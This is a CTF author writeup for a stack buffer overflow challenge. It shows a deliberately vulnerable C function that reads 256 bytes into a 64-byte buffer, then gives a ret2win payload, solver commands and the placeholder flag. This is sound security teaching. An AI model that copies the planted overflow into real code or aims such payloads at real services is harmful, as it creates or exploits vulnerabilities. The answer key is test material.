# Writeup - Return-to-Lose

## Challenge Info

- Category: Pwn
- Topic: Stack buffer overflow, ret2win (no PIE, no canary)
- Flag format: `LYKNCTF{...}`

The release contains:

- `dist/vuln`: Linux x86_64 ELF (needs `flag.txt` next to it when run)

A traveler arrives at a secret checkpoint and is asked for their name. The
interface looks friendly, but the program hides a secret: a function that
can read the flag from a file exists, but it is never called in the
normal execution path.

The task is to exploit a buffer overflow to overwrite the return address
and make the `win` function run.

## The Bug

```c
void win(void)
{
    char flag[128];
    int fd = open("flag.txt", O_RDONLY);
    ...
    read(fd, flag, sizeof(flag));
    write(1, flag, n);
    _exit(0);
}

void vuln(void)
{
    char buf[64];
    write(1, "What's your name, traveler?\n> ", 30);
    read(0, buf, 256);
    write(1, "Safe travels!\n", 14);
}
```

`vuln()` reads up to 256 bytes into a 64-byte stack buffer via
`read(0, buf, 256)` — a classic stack buffer overflow. `win()` opens and
prints `flag.txt` but is never called from `main`.

Protections: NX **on**, PIE **off**, stack canary **off** (built with
`-fno-stack-protector -no-pie -fno-pie -z noexecstack -O0`). Because PIE is
off, `win` sits at a fixed address in every build.

`win()` deliberately uses raw `open`/`read`/`write` syscall wrappers (not
`printf`/`fopen`), so a single `ret` into it works regardless of the
16-byte stack-alignment state after the overflow — no MOVAPS crash, no
need for an extra `ret` gadget to realign the stack.

## Stack Layout in `vuln()`

```
[ buf: 64 bytes ][ saved rbp: 8 ][ return address: 8 ]
```

`buf` sits at `-0x40(%rbp)` (confirmed with `objdump -d dist/vuln`), so:

- padding to reach the saved return address = 64 + 8 = **72 bytes**

`win` is confirmed at a fixed address in the shipped binary:

```bash
$ nm dist/vuln | grep -w win
00000000004011b6 T win
```

## Exploit

```python
payload = b"A" * 72 + p64(0x4011b6)
```

Send this over stdin (or over the TCP connection once the challenge is
deployed); `vuln()` returns into `win()`, which prints the flag.

## Solver

`solve.py` connects to the running service, reads the banner, sends the
payload, and scans the response for the flag:

```bash
python solve.py [host] [port]     # defaults to 127.0.0.1 9001
```

Verified directly against the shipped binary (fed over stdin, same
payload the network solver sends):

```bash
python3 -c "import struct; open('/tmp/payload','wb').write(b'A'*72+struct.pack('<Q',0x4011b6))"
./dist/vuln < /tmp/payload
```

Output:

```text
What's your name, traveler?
> Safe travels!
LYKNCTF{f4k3_f14g}
```

(`flag.txt` in this archive holds a placeholder value for local testing —
replace it with the real flag when deploying.)

## Run Locally

```bash
cd src
gcc -fno-stack-protector -no-pie -fno-pie -z noexecstack -O0 -g0 -o ../dist/vuln vuln.c
cd ..
./dist/vuln          # feed the payload over stdin directly, or
```

Or expose it over TCP like the real deployment (see `setup.md` for the
full walkthrough, including Docker and CTFd notes):

```bash
socat -T60 TCP-LISTEN:9001,reuseaddr,fork EXEC:./dist/vuln,stderr
python solve.py 127.0.0.1 9001
```

If `win`'s address changes after a rebuild, update `WIN_ADDR` in
`solve.py` (`nm dist/vuln | grep -w win`).

## File Map

```
Return-to-Lose/
├─ README.md      this file (author writeup, contains the flag)
├─ setup.md        full local/Docker/CTFd deployment walkthrough
├─ solve.py        network solver (host/port args, default 127.0.0.1:9001)
├─ Dockerfile      builds src/vuln.c and serves dist/vuln over socat on :9001
├─ flag.txt        local/testing flag (placeholder — swap for the real one on deploy)
├─ dist/
│  └─ vuln         built release binary
├─ public/         player-facing package
│  ├─ vuln
│  └─ README.txt   player brief
└─ src/
   └─ vuln.c       full source
```

## Flag

```text
LYKNCTF{f4k3_f14g}
```
